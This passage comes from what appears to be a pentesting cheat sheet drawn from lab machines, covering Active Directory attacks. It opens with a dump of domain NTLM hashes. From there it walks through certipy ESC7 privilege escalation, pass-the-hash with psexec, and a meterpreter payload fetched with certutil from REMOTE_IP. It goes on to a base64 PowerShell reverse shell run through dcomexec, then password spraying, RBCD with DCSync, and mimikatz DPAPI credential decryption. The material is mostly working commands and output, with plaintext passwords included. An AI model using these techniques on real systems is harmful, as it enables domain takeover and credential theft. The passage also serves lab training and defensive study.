Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1108b27a9ff61ed4139d1443fbcf664b:::
ppaul:1951:aad3b435b51404eeaad3b435b51404ee:7785a4172e31e908159b0904e1153ec0:::
llune:2952:aad3b435b51404eeaad3b435b51404ee:e283977e2cbffafc0d6a6bd2a50ea680:::
fflock:3382:aad3b435b51404eeaad3b435b51404ee:1fc1d0f9c5ada600903200bc308f7981:::
jjones:5277:aad3b435b51404eeaad3b435b51404ee:e1ca2a386be17d4a7f938721ece7fef7:::
mmalone:5569:aad3b435b51404eeaad3b435b51404ee:87becdfa676275415836f7e3871eefa3:::
nnoon:5680:aad3b435b51404eeaad3b435b51404ee:f9a5317b1011878fc527848b6282cd6e:::
ldap_monitor:7681:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::
oorend:7682:aad3b435b51404eeaad3b435b51404ee:5af1ff64aac6100ea8fd2223b642d818:::
winrm_svc:7684:aad3b435b51404eeaad3b435b51404ee:4469650fd892e98933b4536d2e86e512:::
batch_runner:7685:aad3b435b51404eeaad3b435b51404ee:d8a34636c7180c5851c19d3e865814e0:::
tbrady:7686:aad3b435b51404eeaad3b435b51404ee:114e76d0be2f60bd75dc160ab3607215:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:989c1783900ffcb85de8d5ca4430c70f:::
delegator$:7687:aad3b435b51404eeaad3b435b51404ee:8689904d05752e977a546e
```

### certipy

Verify certificates and the rights to issue them using certipy:

```bash
$ pip3 install certipy-ad

$ certipy find -u raven@<host> -p R4v3nBe5tD3veloP3r\!123 -dc-ip <host>
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Saved BloodHound data to '20231024175135_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231024175135_Certipy.txt'
[*] Saved JSON output to '20231024175135_Certipy.json'
```

We detect a potential privilege escalation through an attack by ESC7 and the user Raven.

```bash
$ cat 20231024175135_Certipy.txt
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.<host>
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : <DOMAIN>\Administrators
      Access Rights
        Enroll                          : <DOMAIN>\Operator
                                          <DOMAIN>\Authenticated Users
                                          <DOMAIN>\Raven
        ManageCertificates              : <DOMAIN>\Administrators
                                          <DOMAIN>\Domain Admins
                                          <DOMAIN>\Enterprise Admins
        ManageCa                        : <DOMAIN>\Administrators
                                          <DOMAIN>\Domain Admins
                                          <DOMAIN>\Enterprise Admins
                                          <DOMAIN>\Raven
    [!] Vulnerabilities
      ESC7                              : '<DOMAIN>\\Raven' has dangerous permissions
...
```

Synchronize the time with the domain controller:

```bash
$ apt-get install rdate
$ rdate -n <domain> 
```

We're attacking by the manual:

```bash
$ sudo rdate -n <domain>
Wed Oct 25 00:53:27 EEST 2023

$ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@<domain> -password R4v3nBe5tD3veloP3r\!123 -dc-ip <host>
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

$ sudo rdate -n <domain>
Wed Oct 25 01:12:16 EEST 2023

$ certipy ca -ca 'manager-DC01-CA' -username raven@<domain> -password R4v3nBe5tD3veloP3r\!123 -dc-ip <host> -enable-template 'SubCA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'

$ sudo rdate -n <domain>
Wed Oct 25 01:12:29 EEST 2023

$ certipy req -username raven@<domain> -password R4v3nBe5tD3veloP3r\!123 -ca 'manager-DC01-CA' -target <host> -template SubCA -upn administrator@<domain>
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 13
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key
[-] Failed to request certificate

$ sudo rdate -n <domain>
Wed Oct 25 01:12:36 EEST 2023

$ certipy ca -ca 'manager-DC01-CA' -issue-request 13 -username raven@<domain> -password R4v3nBe5tD3veloP3r\!123
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate

$ sudo rdate -n <domain>
Wed Oct 25 01:13:12 EEST 2023

$ certipy req -username raven@<domain> -password R4v3nBe5tD3veloP3r\!123 -ca 'manager-DC01-CA' -target <host> -retrieve 13
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 13
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@<domain>'
[*] Certificate has no object SID
[*] Loaded private key from '13.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Now we get the TGT and pull the hash for it:

```bash
$ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain '<domain>' -dc-ip <host>
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@<domain>
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@<domain>': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

Use psexec to log in as administrator with Pass-The-Hash:

```bash
$ psexec.py <domain>/administrator@<domain> -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -dc-ip <host>
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on <domain>.....
[*] Found writable share ADMIN$
[*] Uploading file hAwLukvn.exe
[*] Opening SVCManager on <domain>.....
[*] Creating service CQoi on <domain>.....
[*] Starting service CQoi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### certutil

Create payload, upload it via certutil and use:

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o s1.exe
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
unzip RunasCs.zip

PS C:\Users> certutil -urlcache -f http://REMOTE_IP:8081/s1.exe s1.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

PS C:\Users> certutil -urlcache -f http://REMOTE_IP:8081/RunasCs.exe RunasCs.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

PS C:\Users> .\RunasCs.exe USERNAME PASSWORD "C:\\Users\\s1.exe"
```

And catch the shell into msfconsole and move to system process:

```shell
$ msfconsole

use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 4444
run

(Meterpreter 1)(C:\Windows\system32) > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeDebugPrivilege
SeIncreaseWorkingSetPrivilege
Run the ps command in meterpreter and find the PID of the winlogon.exe process.

(Meterpreter 1)(C:\Windows\system32) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User          Path
 ---   ----  ----               ----  -------  ----          ----
...
 556   480   winlogon.exe       x64   1                      C:\Windows\System32\winlogon.exe
...

(Meterpreter 1)(C:\Windows\system32) > migrate 556
[*] Migrating from 6336 to 556...
[*] Migration completed successfully.
(Meterpreter 1)(C:\Users\Administrator\Desktop) > shell
Process 1000 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system
```

### CrackMapExec

This package is a swiss army knife for pentesting Windows/Active Directory environments.

From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.

The biggest improvements over the above tools are:

- Pure Python script, no external tools required
- Fully concurrent threading
- Uses ONLY native WinAPI calls for discovering sessions, users, dumping SAM hashes etc…
- Opsec safe (no binaries are uploaded to dump clear-text credentials, inject shellcode etc…)

Additionally, a database is used to store used/dumped credentals. It also automatically correlates Admin credentials to hosts and vice-versa allowing you to easily keep track of credential sets and gain additional situational awareness in large environments.

```shell
apt-get install -y libssl-dev libffi-dev python-dev build-essential
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
poetry install
cp /root/.cme/workspaces/default/smb.db ~/cme_smb.bak
rm -f /root/.cme/workspaces/default/smb.db
poetry run crackmapexec smb <host> -u guest -p '' --shares --rid-brute 10000
poetry run crackmapexec smb <host> -u anonymous -p "" --rid-brute
poetry run crackmapexec smb <host> -u users.txt -p passwords.txt
```

Using the Password spraying, you can find all users also has this password:

```shell
poetry run crackmapexec smb <host> -u users.txt -p 'PASSWORD' --continue-on-success
```

Use the username dictionary you have obtained to try `ASREPRoast`:

```shell
poetry run crackmapexec ldap <host> -u users.txt -p '' --asreproast output.txt
```

### DCSync

There is a technique that allows to bypass (The “Account is sensitive and cannot be delegated”) it with RBCD (Resource-based Constrained Delegation):

```shell
sudo ntpdate -s dc01.<domain>
getTGT.py -dc-ip "dc01.<domain>" <domain>/'delegator$' -hashes ':8689904d05752e977a546e201d09e724'
export KRB5CCNAME=delegator\$.ccache

sudo ntpdate -s dc01.<domain>
rbcd.py '<domain>/delegator$' -delegate-to 'delegator$' -delegate-from ldap_monitor -use-ldaps -action write -k -no-pass -dc-ip <host> -debug

sudo ntpdate -s dc01.<domain>
getTGT.py -dc-ip "dc01.<domain>" "<domain>"/'ldap_monitor':'PASSWORD'
export KRB5CCNAME=ldap_monitor.ccache

sudo ntpdate -s dc01.<domain>
getST.py -spn "browser/dc01.<domain>" -impersonate "dc01$" "<domain>/ldap_monitor" -k -no-pass
export KRB5CCNAME=./delegator\$@dc01.<domain>.ccache

sudo ntpdate -s dc01.<domain>
getST.py -spn 'http/dc01.<domain>' -impersonate 'dc01$' -additional-ticket 'dc01$.ccache' '<domain>/delegator$' -k -no-pass
export KRB5CCNAME=dc01\$.ccache

sudo ntpdate -s dc01.<domain>
secretsdump.py -no-pass -k dc01.<domain> -just-dc-ntlm
```

DCSync is a technique that impersonates a DC by simulating a replication process. secretsdump.py tool is used to carry out this type of attack. It sends an IDL_DRSGetNCChanges request to the DRSUAPI to replicate LDAP directory objects in a given naming context (NC), in order to retrieve Kerberos keys and the secrets contained in the NTDS.DIT database.

We can now retrieve the NT hashes of all domain accounts, as we have dcsync rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All):

```shell
$ secretsdump.py -no-pass -k dc01.<domain> -just-dc-ntlm
```

### dcom-exec

Use `https://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec` on Windows machine:

```shell
$ runas /user:<domain>\svc_openfire /netonly powershell
```

Then:

```shell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.X.X"))

or

[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","10.10.X.X")).Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c ping 10.10.X.X","7")
```

Use `dcomexec` with `-silentcommand` option to get shell for `svc_openfire` user. For reverse shell use `https://www.revshells.com/` and `PowerShell#3(Base64)`, `OS Windows`:

```shell
$ impacket-dcomexec -object MMC20 <domain>/svc_openfire:'!@#$%^&*(1qazxsw'@<host> 'cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -silentcommand

Impacket v0.11.0 - Copyright 2023 Fortra
```

### Decode password

```shell
PS C:\Users> echo 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6 > test.txt
PS C:\Users> $EncryptedString = Get-Content .\test.txt
PS C:\Users> $SecureString = ConvertTo-SecureString $EncryptedString
PS C:\Users> $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
PS C:\Users> echo $Credential.GetNetworkCredential().password
f8gQ8fynP44ek1m3
```

### Evil-WinRM

Check users for accessebility to connect via winrm and connect to remote Windows machine via `winrm`:

```shell
poetry run crackmapexec winrm IP -u users.txt -p 'PASSWORD'

evil-winrm -i IP -u USERNAME -p 'PASSWORD'
```

Connect via `windrm` with hash:

```shell
evil-winrm -i IP -u 'USERNAME' -p 'HASH'
```

### kerbrute

Get valid users for domain:

```shell
cp /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt possible-usernames.txt
sed -i "s|$|@DOMAIN.COM|" possible-usernames.txt
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build
./kerbrute userenum -d DOMAIN.COM ../possible-usernames.txt --dc DOMAIN.COM
```

### mimikatz

The premise is to get the ppotts user, enter `cmdkey /list` to list all stored credentials, you can refer to this article:

```shell
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
```

```shell
C:\Program Files\LibreOffice 5\program>cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic
    User: MyUser

    Target: Domain:interactive=office\hhogan
    Type: Domain Password
    User: office\hhogan
```

You can see the credential information of another user `hhogan`.

It can also be obtained through mimikatz, enter `vault::list`.

```shell
meterpreter > cd 'C:\users\public'
meterpreter > upload mimikatz.exe
[*] Uploading  : /opt/htb/office/mimikatz.exe -> mimikatz.exe
```

```shell
C:\users\public>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Users\PPotts\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Users\PPotts\AppData\Local\Microsoft\Vault
        Items (1)
          1.    (null)
                Type            : {3e0e35be-1b77-43e7-b873-aed901b6275b}
                LastWritten     : 1/18/2024 11:53:30 AM
                Flags           : 00002004
                Ressource       : [STRING] Domain:interactive=office\hhogan
                Identity        : [STRING] office\hhogan
                Authenticator   :
                PackageSid      :
                *Authenticator* : [BYTE*]

                *** Domain Password ***
```

Successfully listed the contents of the windows credential vault used by ppotts, and found the credentials for windows credentials, associated them with the hhogan user, and then looked for the masterkey file and used the credentials found by dir.

```shell
C:\users\public>dir /a:h C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
dir /a:h C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
 Volume in drive C has no label.
 Volume Serial Number is C626-9388

 Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials

05/09/2023  01:08 PM               358 18A1927A997A794B65E9849883AC3F3E
05/09/2023  03:03 PM               398 84F1CAEEBF466550F4967858F9353FB4
01/18/2024  11:53 AM               374 E76CCA3670CD9BB98DF79E0A8D176F1E
               3 File(s)          1,130 bytes
               0 Dir(s)   4,658,167,808 bytes free
```

You can see that there are three different creds. Enter the mimikatz command. For decryption, please refer to this article. Enter the `dpapi::cred` module to decrypt the credentials stored under the Windows Data Protection API (DPAPI). Try to decrypt the credentials located in the Credentials directory of the `PPotts` user. 

Encrypted credentials file for `https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials`.

```shell
dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E
dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\E76CCA3670CD9BB98DF79E0A8D176F1E
```

```shell
C:\users\public>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 88fdf043461d4913a49680c2cf45e8e6
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : b68952824efb5374f396ef024b7f4f56
  dwDataLen          : 00000098 - 152
  pbData             : 0c1483543655e1eee285cb5244a83b72932723e88f937112d54896b19569be22aeda49f9aec91131dab8edae525506e7aa4861c98d67768350051ae93d9c493596d3e506fae0b6e885acd9d2a2837095d7da3f60d80288f4f8b8800171f26639df136e45eb399341ab216c81cf753aecc5342b6b212d85a46be1e2b45f6fcebd140755ec9d328c6d66a7bab635346de54fee236a63d20507
  dwSignLen          : 00000014 - 20
  pbSign             : 3a5e83bb958d713bfae523404a4de188a0319830


mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976


mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\E76CCA3670CD9BB98DF79E0A8D176F1E
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {10811601-0fa9-43c2-97e5-9bef8471fc7d}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 98d5fae89fd2aa297e5b56fff50a935d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 1e6765360d9bbfd511bc5c30e366485d
  dwDataLen          : 000000a8 - 168
  pbData             : b3fe8d6e16f600055f65332874a6a6f1cc9b256edd22812ab615cd680096a34d5ba1baae7a2522beac4a0fd9e2f2af69796a3dba0afba53d87ebc1d779764ae59cb6bc076400e3481cb922032a6b8398c2f76e62ecaf59bd625bef5692ff14f8fd62b6daf2f9576d7bdf36922663452d8f694f78c6e61b23e0f5f37470d8109812e7de03a08264cfbcfb4c489cf4867acf609b6f9297489a1975004723ddb51c9bd1a162255144b3
  dwSignLen          : 00000014 - 20
  pbSign             : 61c53169de0f977282c18917d1bb630d67f3cb33
```

List all projects located in the `C:\\Users\\ppotts\\AppData\oaming\\Microsoft\\Protect\\` directory, including files and subdirectories. Note that the uid depends on the time. Choose the last one. Next, proceed according to GitHub. To get the password, first look for the useruid:

```shell
C:\users\public>powershell Get-ChildItem C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\
powershell Get-ChildItem C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\



    Directory: C:\Users\ppotts\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
```

Continues to list all hidden items, including files and subdirectories, located in the Microsoft\\Protect directory of a specific user (ppotts), containing a SID (Security Identifier):

```shell
C:\users\public>powershell Get-ChildItem -Hidden C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\
powershell Get-ChildItem -Hidden C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\


    Directory: C:\Users\ppotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE
-a-hs-         1/17/2024   3:43 PM             24 Preferred
```

Use the `dpapi::masterkey` module to decrypt and display the contents of the DPAPI (Data Protection API) Master Key under the specified path:

```shell
mimikatz # dpapi::masterkey /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb"

**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : c521daa0857ee4fa6e4246266081e94c
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : a2741b13d7261697be4241ebbe05098a
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665


Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
```

As this `191d3f9d-7959-4b4d-a520-a444853c47eb` master key belongs to the current user, we can certainly use it with the /rpc argument:

```shell
mimikatz # dpapi::masterkey /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
